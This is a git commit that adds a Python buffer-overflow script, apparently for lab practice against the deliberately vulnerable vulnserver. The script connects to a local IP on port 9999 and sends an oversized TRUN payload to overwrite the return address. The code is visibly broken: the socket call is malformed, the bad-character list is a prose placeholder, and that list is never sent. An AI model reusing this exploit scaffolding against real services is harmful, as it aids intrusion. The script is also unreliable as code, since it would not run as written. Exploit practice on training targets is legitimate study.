b1edf34a9585c18bb53f9eac8f17ed67d2da6bb8
eneroh <en@archltp.localdomain>
2022-07-18 23:15:57 +1000

    Heavy research into buffer overflow and collection of relevant scripts for win10 vulnserver, addition of extra buffer overflow related tool

---
+++ scripts/buffer_overflow/buffer_overflow_-_finding_bad_chars.py
@@ -0,0 +1,17 @@
+#!/usr/bin/python
+
+import sys, socket
+
+badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x10\x11\x12\x13\x14\x15\x16 continues in hex to f")
+
+shellcode = "A" * 2003 + "B" * 4
+
+try:
+    s=socket.socket(socket.AF_INET.socket.SOCK_STREAM
+    s.connect(('192.168.1.90',9999))
+    s.send(('TRUN //.:/' + shellcode))
+    s.close()
+
+except:
+    print "Error connecting to server"
+    sys.exit()
